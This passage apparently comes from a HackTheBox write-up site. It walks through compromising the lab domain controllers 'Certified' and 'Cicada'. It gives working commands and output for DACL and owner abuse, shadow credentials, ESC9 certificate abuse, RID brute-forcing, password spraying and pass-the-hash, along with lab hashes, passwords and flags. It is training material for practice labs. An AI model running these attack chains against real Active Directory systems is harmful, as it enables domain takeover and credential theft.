 open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-22 01:15:13Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-05-22T01:16:46+00:00; +7h00m01s from scanner time.\n| ssl-cert: Subject: commonName=DC01.certified.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certified.htb\n| Not valid before: 2024-05-13T15:49:36\n|_Not valid after:  2025-05-13T15:49:36\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.certified.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certified.htb\n| Not valid before: 2024-05-13T15:49:36\n|_Not valid after:  2025-05-13T15:49:36\n|_ssl-date: 2025-05-22T01:16:47+00:00; +7h00m01s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-05-22T01:16:46+00:00; +7h00m01s from scanner time.\n| ssl-cert: Subject: commonName=DC01.certified.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certified.htb\n| Not valid before: 2024-05-13T15:49:36\n|_Not valid after:  2025-05-13T15:49:36\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-05-22T01:16:47+00:00; +7h00m01s from scanner time.\n| ssl-cert: Subject: commonName=DC01.certified.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.certified.htb\n| Not valid before: 2024-05-13T15:49:36\n|_Not valid after:  2025-05-13T15:49:36\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49683/tcp open  msrpc         Microsoft Windows RPC\n49716/tcp open  msrpc         Microsoft Windows RPC\n49740/tcp open  msrpc         Microsoft Windows RPC\n</code></pre> <p>Get users and make a list.</p> <p></p> <p>With <code>ldapsearch</code>, get all the users.</p> <pre><code>$ ldapsearch -x -H ldap://certified.htb -D \"certified\\judith.mader\" -W -b \"DC=certified,DC=htb\" \"(objectClass=user)\"\n...\n# DC01, Domain Controllers, certified.htb\ndn: CN=DC01,OU=Domain Controllers,DC=certified,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\nobjectClass: computer\ncn: DC01\nuserCertificate:: MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0B\n AQsFADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlmaWVkMRowG\n AYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZaFw0yNTA1MTMxNTQ5MzZaMB\n 0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQo\n CggEBAMx/FhgH36heOUjpNhO4JWYXE0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvg\n FLZ7yuZf3ubIcEv8wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmo\n X3iKy0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l652hfOhdz5Y\n OU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2Ee+28xaBIGAgNn5TMcS+oJC0\n qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0CAwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQi\n HiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIK\n wYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA\n 4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBgl\n ghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFPTg6Uo2pYQv7jJTC9x7Reo9\n CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1LcsBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2gg\n bqGgbdsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYy\n UyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWV\n kLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz\n dHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggrBgEFBQcwAoaBpWxkYXA6Ly8vQ\n 049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPV\n NlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXR\n lP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG\n AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIwTgYJKwYBBAGCN\n xkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1OTc4MDkxLTM4Mj\n AzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDk\n yiu7uCaTOehQ4rITZE1xefpHWVVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJ\n Hsk+gby/JShvztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuEa\n OEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQUfgVn+2b7pjWIPA\n WdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtIzQY41iYatWCKZW54Ylno2wj9tg=\n =\ndistinguishedName: CN=DC01,OU=Domain Controllers,DC=certified,DC=htb\n....\nmsDS-SupportedEncryptionTypes: 28\nmsDS-GenerationId:: INcb22axygg=\nmsDFSR-ComputerReferenceBL: CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFS\n R-GlobalSettings,CN=System,DC=certified,DC=htb\n</code></pre> <p>Using <code>bloodhound-ce-python</code>, collect the data and import it into BloodHound.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"certified/#initial-access","title":"Initial Access","text":"<p>First, make <code>judith</code> the owner of the <code>management</code> group by abusing <code>WriteOwner</code>.</p> <pre><code>$ impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Current owner information below\n[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512\n[*] - sAMAccountName: Domain Admins\n[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb\n[*] OwnerSid modified successfully!\n</code></pre> <p>Then edit the DACL to be able to edit members.</p> <pre><code>$ impacket-dacledit -dc-ip 10.10.11.41 certified.htb/judith.mader:judith09 -action write -rights WriteMembers -principal judith.mader -target management\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] DACL backed up to dacledit-20250522-131845.bak\n[*] DACL modified successfully!\n</code></pre> <p>Now add <code>judith</code> to the group</p> <pre><code>$ net rpc group addmem \"management\" \"judith.mader\" -U \"certified.htb/judith.mader%judith09\" -S dc01.certified.htb\n</code></pre> <p>Then, perform a shadow credentials attack over the <code>management_svc</code> account by abusing <code>GenericWrite</code>.</p> <pre><code>$ python pywhisker/pywhisker/pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action add --filename management_svc\n[*] Searching for the target account\n[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating KeyCredential\n[*] KeyCredential generated with DeviceID: d982a5f5-268e-b993-565a-7fd605c01d1f\n[*] Updating the msDS-KeyCredentialLink attribute of management_svc\n[+] Updated the msDS-KeyCredentialLink attribute of the target object\n[*] Converting PEM -&gt; PFX with cryptography: management_svc.pfx\n[+] PFX exportiert nach: management_svc.pfx\n[i] Passwort f\u00fcr PFX: n1jtA5vBiOpObIKTJ4gA\n[+] Saved PFX (#PKCS12) certificate &amp; key at path: management_svc.pfx\n[*] Must be used with password: n1jtA5vBiOpObIKTJ4gA\n[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools\n</code></pre> <p>Now, using <code>gettgtpkinit.py</code> and <code>getnthash.py</code>, get a ticket and obtain the NTLM hash.</p> <pre><code>$ python gettgtpkinit.py -cert-pfx management_svc.pfx -pfx-pass n1jtA5vBiOpObIKTJ4gA certified.htb/management_svc management_svc.ccache\n2025-05-23 00:19:13,849 minikerberos INFO     Loading certificate and key from file\nINFO:minikerberos:Loading certificate and key from file\n2025-05-23 00:19:13,874 minikerberos INFO     Requesting TGT\nINFO:minikerberos:Requesting TGT\n2025-05-22 17:19:17,395 minikerberos INFO     AS-REP encryption key (you might need this later):\nINFO:minikerberos:AS-REP encryption key (you might need this later):\n2025-05-22 17:19:17,395 minikerberos INFO     75397ef592192d344219ea4a890a2b65c1ebe1a8d3ca82a36b9891fc29b6fa4b\nINFO:minikerberos:75397ef592192d344219ea4a890a2b65c1ebe1a8d3ca82a36b9891fc29b6fa4b\n2025-05-22 17:19:17,397 minikerberos INFO     Saved TGT to file\nINFO:minikerberos:Saved TGT to file\n</code></pre> <pre><code>$ export KRB5CCNAME=management_svc.ccache\n</code></pre> <pre><code>$ python getnthash.py -key 75397ef592192d344219ea4a890a2b65c1ebe1a8d3ca82a36b9891fc29b6fa4b certified.htb/management_svc\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Using TGT from cache\n[*] Requesting ticket to self with PAC\nRecovered NT Hash\na091c1832bcdd4677c28b5a6a1295584\n</code></pre> <pre><code>$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584\n\nEvil-WinRM shell v3.7\n\n*Evil-WinRM* PS C:\\Users\\management_svc\\Documents&gt; whoami\ncertified\\management_svc\n</code></pre> <p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\management_svc\\Desktop&gt; type user.txt\ncb15cf06b36bc8455912ebf17e785e9e\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"certified/#privilege-escalation","title":"Privilege Escalation","text":"<p>The user has <code>GenericAll</code> over <code>ca_operator</code>.</p> <pre><code>$ python pywhisker/pywhisker/pywhisker.py -d certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 --target ca_operator --action add --filename ca_operator\n[*] Searching for the target account\n[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating KeyCredential\n[*] KeyCredential generated with DeviceID: 2b7e4043-ec2b-dab2-4602-7d5384bd420c\n[*] Updating the msDS-KeyCredentialLink attribute of ca_operator\n[+] Updated the msDS-KeyCredentialLink attribute of the target object\n[*] Converting PEM -&gt; PFX with cryptography: ca_operator.pfx\n[+] PFX exportiert nach: ca_operator.pfx\n[i] Passwort f\u00fcr PFX: K6DBzJkZhDRrsjH5ugGO\n[+] Saved PFX (#PKCS12) certificate &amp; key at path: ca_operator.pfx\n[*] Must be used with password: K6DBzJkZhDRrsjH5ugGO\n[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools\n</code></pre> <pre><code>$ python gettgtpkinit.py -cert-pfx ca_operator.pfx -pfx-pass K6DBzJkZhDRrsjH5ugGO certified.htb/ca_operator ca_operator.ccache\n2025-05-23 03:09:50,320 minikerberos INFO     Loading certificate and key from file\nINFO:minikerberos:Loading certificate and key from file\n2025-05-23 03:09:50,347 minikerberos INFO     Requesting TGT\nINFO:minikerberos:Requesting TGT\n2025-05-22 20:10:00,603 minikerberos INFO     AS-REP encryption key (you might need this later):\nINFO:minikerberos:AS-REP encryption key (you might need this later):\n2025-05-22 20:10:00,604 minikerberos INFO     5e900797e2ee30cadf8284cf5425827acc35e59532b905f4ff6dea1b9a758993\nINFO:minikerberos:5e900797e2ee30cadf8284cf5425827acc35e59532b905f4ff6dea1b9a758993\n2025-05-22 20:10:00,606 minikerberos INFO     Saved TGT to file\nINFO:minikerberos:Saved TGT to file\n</code></pre> <pre><code>$ export KRB5CCNAME=ca_operator.ccache\n</code></pre> <pre><code>$ python getnthash.py -key e56fd78b3fe6abbbb62f4819e7fd295a5a4acf9d778bcaab4fbf3e7cf9d923b0 certified.htb/ca_operator\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Using TGT from cache\n[*] Requesting ticket to self with PAC\nRecovered NT Hash\nb4b86f45c6018f1b664f70805f45d8f2\n</code></pre> <p>We know that ADCS (Active Directory Certificate Service) is running on the Domain Controller, so scan for certificate vulnerabilities with <code>certipy</code>.</p> <pre><code>$ certipy-ad find -dc-ip 10.10.11.41 -ns 10.10.11.41 -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 15 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Successfully retrieved CA configuration for 'certified-DC01-CA'\n[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[*] Enumeration output:\nCertificate Authorities\n  0\n    CA Name                             : certified-DC01-CA\n    DNS Name                            : DC01.certified.htb\n    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb\n...\n        Enrollment Rights               : CERTIFIED.HTB\\operator ca\n                                          CERTIFIED.HTB\\Domain Admins\n                                          CERTIFIED.HTB\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : CERTIFIED.HTB\\Administrator\n        Full Control Principals         : CERTIFIED.HTB\\Domain Admins\n                                          CERTIFIED.HTB\\Enterprise Admins\n        Write Owner Principals          : CERTIFIED.HTB\\Domain Admins\n                                          CERTIFIED.HTB\\Enterprise Admins\n        Write Dacl Principals           : CERTIFIED.HTB\\Domain Admins\n                                          CERTIFIED.HTB\\Enterprise Admins\n        Write Property Enroll           : CERTIFIED.HTB\\Domain Admins\n                                          CERTIFIED.HTB\\Enterprise Admins\n    [+] User Enrollable Principals      : CERTIFIED.HTB\\operator ca\n    [!] Vulnerabilities\n      ESC9                              : Template has no security extension.\n    [*] Remarks\n      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.\n</code></pre> <p>There is an ESC9 vulnerability, which allows us to change a user's UPN. Let's change <code>ca_operator</code>'s UPN to <code>Administrator</code> and request a certificate.</p> <p>First, change <code>ca_operator</code>'s UPN</p> <pre><code>$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator\n\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.\n[!] Use -debug to print a stacktrace\n[*] Updating user 'ca_operator':\n    userPrincipalName                   : Administrator\n[*] Successfully updated 'ca_operator'\n</code></pre> <p>Get the admin's certificate</p> <pre><code>$ certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA  -template CertifiedAuthentication\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.\n[!] Use -debug to print a stacktrace\n[*] Requesting certificate via RPC\n[*] Request ID is 7\n[*] Successfully requested certificate\n[*] Got certificate with UPN 'Administrator'\n[*] Certificate has no object SID\n[*] Try using -sid to set the object SID or see the wiki for more details\n[*] Saving certificate and private key to 'administrator.pfx'\n[*] Wrote certificate and private key to 'administrator.pfx\n</code></pre> <p>Restore <code>ca_operator</code>'s UPN</p> <pre><code>$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator  \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.\n[!] Use -debug to print a stacktrace\n[*] Updating user 'ca_operator':\n    userPrincipalName                   : ca_operator\n[*] Successfully updated 'ca_operator'\n</code></pre> <p>Get the NTLM hash</p> <pre><code>$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.10.11.41\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'Administrator'\n[*] Using principal: 'administrator@certified.htb'\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to 'administrator.ccache'\n[*] Wrote credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34\n</code></pre> <p>Enter the host via <code>evil-winrm</code></p> <pre><code>$ evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\ncertified\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"certified/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\nf4923a975d690a09cf241ea2c931ac53\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cicada/","title":"Cicada","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cicada/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.35 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 13:30 CEST\nNmap scan report for 10.10.11.35\nHost is up (0.041s latency).\nNot shown: 65522 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        (generic dns response: SERVFAIL)\n| fingerprint-strings: \n|   DNS-SD-TCP: \n|     _services\n|     _dns-sd\n|     _udp\n|_    local\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-09 18:30:54Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n56206/tcp open  msrpc         Microsoft Windows RPC\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-05-09T18:31:48\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 6h59m59s\n</code></pre> <p>We can access some shares with the <code>guest</code> user.</p> <p></p> <p>Get the note inside the <code>HR</code> folder.</p> <pre><code>$ smbclient -U '' //10.10.11.35/hr \nPassword for [WORKGROUP\\]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Thu Mar 14 13:29:09 2024\n  ..                                  D        0  Thu Mar 14 13:21:29 2024\n  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024\n\n                4168447 blocks of size 4096. 449846 blocks available\nsmb: \\&gt; get \"Notice from HR.txt\"\ngetting file \\Notice from HR.txt of size 1266 as Notice from HR.txt (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec)\nsmb: \\&gt; exit\n</code></pre> <pre><code>$ cat Notice\\ from\\ HR.txt \n\nDear new hire!\n\nWelcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.\n\nYour default password is: Cicada$M6Corpb*@Lp#nZp!8\n\nTo change your password:\n\n1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.\n2. Once logged in, navigate to your account settings or profile settings section.\n3. Look for the option to change your password. This will be labeled as \"Change Password\".\n4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.\n5. After changing your password, make sure to save your changes.\n\nRemember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.\n\nIf you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.\n\nThank you for your attention to this matter, and once again, welcome to the Cicada Corp team!\n\nBest regards,\nCicada Corp\n</code></pre> <p>Enumerate the domain users by brute-forcing with <code>rid</code> and make a list.</p> <pre><code>$ nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute\nSMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                                                                                       \nSMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\\guest: \nSMB         10.10.11.35     445    CICADA-DC        498: CICADA\\Enterprise Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        500: CICADA\\Administrator (SidTypeUser)\nSMB         10.10.11.35     445    CICADA-DC        501: CICADA\\Guest (SidTypeUser)\nSMB         10.10.11.35     445    CICADA-DC        502: CICADA\\krbtgt (SidTypeUser)\nSMB         10.10.11.35     445    CICADA-DC        512: CICADA\\Domain Admins (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        513: CICADA\\Domain Users (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        514: CICADA\\Domain Guests (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        515: CICADA\\Domain Computers (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        516: CICADA\\Domain Controllers (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        517: CICADA\\Cert Publishers (SidTypeAlias)\nSMB         10.10.11.35     445    CICADA-DC        518: CICADA\\Schema Admins (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        519: CICADA\\Enterprise Admins (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        520: CICADA\\Group Policy Creator Owners (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        521: CICADA\\Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        522: CICADA\\Cloneable Domain Controllers (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        525: CICADA\\Protected Users (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        526: CICADA\\Key Admins (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        527: CICADA\\Enterprise Key Admins (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        553: CICADA\\RAS and IAS Servers (SidTypeAlias)\nSMB         10.10.11.35     445    CICADA-DC        571: CICADA\\Allowed RODC Password Replication Group (SidTypeAlias)\nSMB         10.10.11.35     445    CICADA-DC        572: CICADA\\Denied RODC Password Replication Group (SidTypeAlias)\nSMB         10.10.11.35     445    CICADA-DC        1000: CICADA\\CICADA-DC$ (SidTypeUser)\nSMB         10.10.11.35     445    CICADA-DC        1101: CICADA\\DnsAdmins (SidTypeAlias)\nSMB         10.10.11.35     445    CICADA-DC        1102: CICADA\\DnsUpdateProxy (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        1103: CICADA\\Groups (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        1104: CICADA\\john.smoulder (SidTypeUser)\nSMB         10.10.11.35     445    CICADA-DC        1105: CICADA\\sarah.dantelia (SidTypeUser)\nSMB         10.10.11.35     445    CICADA-DC        1106: CICADA\\michael.wrightson (SidTypeUser)\nSMB         10.10.11.35     445    CICADA-DC        1108: CICADA\\david.orelious (SidTypeUser)\nSMB         10.10.11.35     445    CICADA-DC        1109: CICADA\\Dev Support (SidTypeGroup)\nSMB         10.10.11.35     445    CICADA-DC        1601: CICADA\\emily.oscars (SidTypeUser)\n</code></pre> <pre><code>cat users | grep SidTypeUser | awk '{print $6}' | awk -F\\\\ '{print $2}' | sponge users\n</code></pre> <p>Now, using <code>nxc</code>, check if any user has the default password.</p> <p></p> <p>We have <code>michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code>.</p> <p>Enumerating users with <code>rpc</code>, there is a user with the password in the description field.</p> <pre><code>$ rpcclient -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35\nrpcclient $&gt; querydispinfo\nindex: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain\nindex: 0xfeb RID: 0x454 acb: 0x00000210 Account: david.orelious Name: (null)    Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3\nindex: 0x101d RID: 0x641 acb: 0x00000210 Account: emily.oscars  Name: Emily 